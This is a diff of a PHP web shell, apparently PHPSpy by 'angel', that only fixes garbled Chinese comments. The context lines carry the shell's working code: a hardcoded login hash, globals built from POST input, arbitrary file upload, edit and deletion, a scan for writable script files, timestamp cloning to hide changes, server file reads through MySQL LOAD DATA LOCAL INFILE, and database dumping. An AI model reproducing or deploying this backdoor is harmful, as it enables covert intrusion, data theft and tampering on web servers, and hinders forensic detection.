@@ -18,26 +18,26 @@ foreach($_POST as $key => $value) {
 	}
 	$$key = $value;
 }
-/*===================== 绋嬪簭閰嶇疆 =====================*/
+/*===================== 程序配置 =====================*/
 
 //echo encode_pass('angel');exit;
 //angel = ec38fe2a8497e0a8d6d349b3533038cb
-// 濡傛灉闇€瑕佸瘑鐮侀獙璇�,璇蜂慨鏀圭櫥闄嗗瘑鐮�,鐣欑┖涓轰笉闇€瑕侀獙璇�
+// 如果需要密码验?,请修改登陆密?,留空为不需要验?
 $pass  = 'd96ee15a2c1607c2f4c2183ec922762b'; //angel
 
-//濡傛偍瀵� cookie 浣滅敤鑼冨洿鏈夌壒娈婅姹�, 鎴栫櫥褰曚笉姝ｅ父, 璇蜂慨鏀逛笅闈㈠彉閲�, 鍚﹀垯璇蜂繚鎸侀粯璁�
-// cookie 鍓嶇紑
+//如您? cookie 作用范围有特殊要?, 或登录不正常, 请修改下面变?, 否则请保持默?
+// cookie 前缀
 $cookiepre = '';
-// cookie 浣滅敤鍩�
+// cookie 作用?
 $cookiedomain = '';
-// cookie 浣滅敤璺緞
+// cookie 作用路径
 $cookiepath = '/';
-// cookie 鏈夋晥鏈�
+// cookie 有效?
 $cookielife = 86400;
 
-//绋嬪簭鎼滅储鍙啓鏂囦欢鐨勭被鍨�
+//程序搜索可写文件的类?
 !$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
-/*===================== 閰嶇疆缁撴潫 =====================*/
+/*===================== 配置结束 =====================*/
 
 $charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
 if ($charset == 'utf8') {
@@ -57,7 +57,7 @@ if ($charset == 'utf8') {
 $self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 $timestamp = time();
 
-/*===================== 韬唤楠岃瘉 =====================*/
+/*===================== 身份验证 =====================*/
 if ($action == "logout") {
 	scookie('loginpass', '', -86400 * 365);
 	@header('Location: '.$self);
@@ -79,12 +79,12 @@ if($pass) {
 		loginpage();
 	}
 }
-/*===================== 楠岃瘉缁撴潫 =====================*/
+/*===================== 验证结束 =====================*/
 
 $errmsg = '';
 !$action && $action = 'file';
 
-// 鏌ョ湅PHPINFO
+// 查看PHPINFO
 if ($action == 'phpinfo') {
 	if (IS_PHPINFO) {
 		phpinfo();
@@ -94,7 +94,7 @@ if ($action == 'phpinfo') {
 	}
 }
 
-// 涓嬭浇鏂囦欢
+// 下载文件
 if ($doing == 'downfile' && $thefile) {
 	if (!@file_exists($thefile)) {
 		$errmsg = 'The file you want Downloadable was nonexistent';
@@ -108,7 +108,7 @@ if ($doing == 'downfile' && $thefile) {
 	}
 }
 
-// 鐩存帴涓嬭浇澶囦唤鏁版嵁搴�
+// 直接下载备份数据?
 if ($doing == 'backupmysql' && !$saveasfile) {
 	if (!$table) {
 		$errmsg ='Please choose the table';
@@ -127,7 +127,7 @@ if ($doing == 'backupmysql' && !$saveasfile) {
 	}
 }
 
-// 閫氳繃MYSQL涓嬭浇鏂囦欢
+// 通过MYSQL下载文件
 if($doing=='mysqldown'){
 	if (!$dbname) {
 		$errmsg = 'Please input dbname';
@@ -140,7 +140,7 @@ if($doing=='mysqldown'){
 			if(!$result){
 				q("DROP TABLE IF EXISTS tmp_angel;");
 				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
-				//鐢ㄦ椂闂存埑鏉ヨ〃绀烘埅鏂�,閬垮厤鍑虹幇璇诲彇鑷韩鎴栧寘鍚玙_angel_1111111111_eof__鐨勬枃浠舵椂涓嶅畬鏁寸殑鎯呭喌
+				//用时间戳来表示截?,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况
 				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
 				$result = q("select content from tmp_angel");
 				q("DROP TABLE tmp_angel");
@@ -353,7 +353,7 @@ if(!function_exists('posix_getegid')) {
 <?php
 $errmsg && m($errmsg);
 
-// 鑾峰彇褰撳墠璺緞
+// 获取当前路径
 if (!$dir) {
 	$dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
 }
@@ -364,10 +364,10 @@ if (substr($dir, -1) != '/') {
 
 if ($action == 'file') {
 
-	// 鍒ゆ柇璇诲啓鎯呭喌
+	// 判断读写情况
 	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
 
-	// 鍒涘缓鐩綍
+	// 创建目录
 	if ($newdirname) {
 		$mkdirs = $nowpath.$newdirname;
 		if (file_exists($mkdirs)) {
@@ -378,19 +378,19 @@ if ($action == 'file') {
 		}
 	}
 
-	// 涓婁紶鏂囦欢
+	// 上传文件
 	elseif ($doupfile) {
 		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
 	}
 
-	// 缂栬緫鏂囦欢
+	// 编辑文件
 	elseif ($editfilename && $filecontent) {
 		$fp = @fopen($editfilename,'w');
 		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
 		@fclose($fp);
 	}
 
-	// 缂栬緫鏂囦欢灞炴€�
+	// 编辑文件属?
 	elseif ($pfile && $newperm) {
 		if (!file_exists($pfile)) {
 			m('The original file does not exist');
@@ -400,7 +400,7 @@ if ($action == 'file') {
 		}
 	}
 
-	// 鏀瑰悕
+	// 改名
 	elseif ($oldname && $newfilename) {
 		$nname = $nowpath.$newfilename;
 		if (file_exists($nname) || !file_exists($oldname)) {
@@ -410,7 +410,7 @@ if ($action == 'file') {
 		}
 	}
 
-	// 澶嶅埗鏂囦欢
+	// 复制文件
 	elseif ($sname && $tofile) {
 		if (file_exists($tofile) || !file_exists($sname)) {
 			m('The goal file has already existed or original file does not exist');
@@ -419,7 +419,7 @@ if ($action == 'file') {
 		}
 	}
 
-	// 鍏嬮殕鏃堕棿
+	// 克隆时间
 	elseif ($curfile && $tarfile) {
 		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
 			m('The goal file has already existed or original file does not exist');
@@ -429,7 +429,7 @@ if ($action == 'file') {
 		}
 	}
 
-	// 鑷畾涔夋椂闂�
+	// 自定义时?
 	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
 		if (!@file_exists($curfile)) {
 			m(basename($curfile).' does not exist');
@@ -439,7 +439,7 @@ if ($action == 'file') {
 		}
 	}
 
-	// 鎵归噺鍒犻櫎鏂囦欢
+	// 批量删除文件
 	elseif($doing == 'delfiles') {
 		if ($dl) {
 			$dfiles='';
@@ -465,7 +465,7 @@ if ($action == 'file') {
 		}
 	}
 
-	//鎿嶄綔瀹屾瘯
+	//操作完毕
 	formhead(array('name'=>'createdir'));
 	makehide('newdirname');
 	makehide('dir',$nowpath);
@@ -586,7 +586,7 @@ function shownav(e){
 
 	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
 
-	//鏌ョ湅鎵€鏈夊彲鍐欐枃浠跺拰鐩綍
+	//查看所有可写文件和目录
 	$dirdata=array();
 	$filedata=array();
 
@@ -600,8 +600,8 @@ function shownav(e){
 		$dirdata = array();
 		$filedata = GetSFileList($nowpath, $findstr, $re);
 	} else {
-		// 鐩綍鍒楄〃
-		//scandir()鏁堢巼鏇撮珮
+		// 目录列表
+		//scandir()效率更高
 		$dirs=@opendir($dir);
 		while ($file=@readdir($dirs)) {
 			$filepath=$nowpath.$file;
@@ -876,7 +876,7 @@ elseif ($action == 'mysqladmin') {
 	p('</p>');
 	formfoot();
 
-	//鎿嶄綔璁板綍
+	//操作记录
 	formhead(array('name'=>'recordlist'));
 	makehide('doing');
 	makehide('action','mysqladmin');
@@ -885,7 +885,7 @@ elseif ($action == 'mysqladmin') {
 	p($dbform);
 	formfoot();
 
-	//閫夊畾鏁版嵁搴�
+	//选定数据?
 	formhead(array('name'=>'setdbname'));
 	makehide('action','mysqladmin');
 	p($dbform);
@@ -894,7 +894,7 @@ elseif ($action == 'mysqladmin') {
 	}
 	formfoot();
 
-	//閫夊畾琛�
+	//选定?
 	formhead(array('name'=>'settable'));
 	makehide('action','mysqladmin');
 	p($dbform);
@@ -914,12 +914,12 @@ elseif ($action == 'mysqladmin') {
 	}
 	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
 		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
-		//鑾峰彇鏁版嵁搴撲俊鎭�
+		//获取数据库信?
 		$mysqlver = mysql_get_server_info();
 		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
 		$highver = $mysqlver > '4.1' ? 1 : 0;
 
-		//鑾峰彇鏁版嵁搴�
+		//获取数据?
 		$query = q("SHOW DATABASES");
 		$dbs = array();
 		$dbs[] = '-- Select a database --';
@@ -1093,7 +1093,7 @@ elseif ($action == 'mysqladmin') {
 									/*********************/
 									$getfield = q("SHOW COLUMNS FROM $tablename");
 									$rowdb = array();
-									$keyfied = ''; //涓婚敭瀛楁
+									$keyfied = ''; //主键字段
 									while($row = @mysql_fetch_assoc($getfield)) {
 										$rowdb[$row['Field']]['Key'] = $row['Key'];
 										$rowdb[$row['Field']]['Extra'] = $row['Extra'];
@@ -1102,7 +1102,7 @@ elseif ($action == 'mysqladmin') {
 										}
 									}
 									/*********************/
-									//鐩存帴娴忚琛ㄦ寜鐓т富閿檷搴忔帓鍒�
+									//直接浏览表按照主键降序排?
 									if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
 										$query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
 									}
@@ -1126,10 +1126,10 @@ elseif ($action == 'mysqladmin') {
 										$thisbg = bg();
 										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
 										$where = $tmp = $b1 = '';
-										//閫夊彇鏉′欢瀛楁鐢�
+										//选取条件字段?
 										foreach($mn as $key=>$inside){
 											if ($inside) {
-												//鏌ユ壘涓婚敭銆佸敮涓€灞炴€с€佽嚜鍔ㄥ鍔犵殑瀛楁锛屾壘鍒板氨鍋滄锛屽惁鍒欑粍鍚堟墍鏈夊瓧娈典綔涓烘潯浠躲€�
+												//查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件?
 												if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
 													$where = $key."='".addslashes($inside)."'";
 													break;
@@ -1138,7 +1138,7 @@ elseif ($action == 'mysqladmin') {
 												$tmp = ' AND ';
 											}
 										}
-										//璇诲彇璁板綍鐢�
+										//读取记录?
 										foreach($mn as $key=>$inside){
 											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
 										}
@@ -1584,7 +1584,7 @@ else {
 <?php
 
 /*======================================================
-鍑芥暟搴�
+函数?
 ======================================================*/
 
 function secparam($n, $v) {
@@ -1646,7 +1646,7 @@ function multi($num, $perpage, $curpage, $tablename) {
 	}
 	return $multipage;
 }
-// 鐧婚檰鍏ュ彛
+// 登陆入口
 function loginpage() {
 ?>
 	<style type="text/css">
@@ -1712,7 +1712,7 @@ function dirsize($dir) {
 	@closedir($dh);
 	return $size;
 }
-// 椤甸潰璋冭瘯淇℃伅
+// 页面调试信息
 function debuginfo() {
 	global $starttime;
 	$mtime = explode(' ', microtime());
@@ -1720,7 +1720,7 @@ function debuginfo() {
 	echo 'Processed in '.$totaltime.' second(s)';
 }
 
-//杩炴帴MYSQL鏁版嵁搴�
+//连接MYSQL数据?
 function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
 	global $charsetdb;
 	@ini_set('mysql.connect_timeout', 5);
@@ -1742,7 +1742,7 @@ function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306')
 	return $link;
 }
 
-// 鍘绘帀杞箟瀛楃
+// 去掉转义字符
 function s_array(&$array) {
 	if (is_array($array)) {
 		foreach ($array as $k => $v) {
@@ -1754,7 +1754,7 @@ function s_array(&$array) {
 	return $array;
 }
 
-// 娓呴櫎HTML浠ｇ爜
+// 清除HTML代码
 function html_clean($content) {
 	$content = htmlspecialchars($content);
 	$content = str_replace("\n", "<br />", $content);
@@ -1763,7 +1763,7 @@ function html_clean($content) {
 	return $content;
 }
 
-// 鑾峰彇鏉冮檺
+// 获取权限
 function getChmod($filepath){
 	return substr(base_convert(@fileperms($filepath),10,8),-4);
 }
@@ -1806,7 +1806,7 @@ function getUser($filepath)	{
 	return '';
 }
 
-// 鍒犻櫎鐩綍
+// 删除目录
 function deltree($deldir) {
 	$mydir=@dir($deldir);
 	while($file=$mydir->read())	{
@@ -1824,13 +1824,13 @@ function deltree($deldir) {
 	return @rmdir($deldir) ? 1 : 0;
 }
 
-// 琛ㄦ牸琛岄棿鐨勮儗鏅壊鏇挎崲
+// 表格行间的背景色替换
 function bg() {
 	global $bgc;
 	return ($bgc++%2==0) ? 'alt1' : 'alt2';
 }
 
-// 鑾峰彇褰撳墠鐨勬枃浠剁郴缁熻矾寰�
+// 获取当前的文件系统路?
 function getPath($scriptpath, $nowpath) {
 	if ($nowpath == '.') {
 		$nowpath = $scriptpath;
@@ -1843,7 +1843,7 @@ function getPath($scriptpath, $nowpath) {
 	return $nowpath;
 }
 
-// 鑾峰彇褰撳墠鐩綍鐨勪笂绾х洰褰�
+// 获取当前目录的上级目?
 function getUpPath($nowpath) {
 	$pathdb = explode('/', $nowpath);
 	$num = count($pathdb);
@@ -1855,7 +1855,7 @@ function getUpPath($nowpath) {
 	return $uppath;
 }
 
-// 妫€鏌HP閰嶇疆鍙傛暟
+// 检查PHP配置参数
 function getcfg($varname) {
 	$result = get_cfg_var($varname);
 	if ($result == 0) {
@@ -1867,12 +1867,12 @@ function getcfg($varname) {
 	}
 }
 
-// 妫€鏌ュ嚱鏁版儏鍐�
+// 检查函数情?
 function getfun($funName) {
 	return (false !== function_exists($funName)) ? 'Yes' : 'No';
 }
 
-// 鑾峰緱鏂囦欢鎵╁睍鍚�
+// 获得文件扩展?
 function getext($file) {
 	$info = pathinfo($file);
 	return $info['extension'];
@@ -2008,7 +2008,7 @@ function sizecount($fileSize) {
 	$sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
 	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
 }
-// 澶囦唤鏁版嵁搴�
+// 备份数据?
 function sqldumptable($table, $fp=0) {
 	global $mysqllink;
 
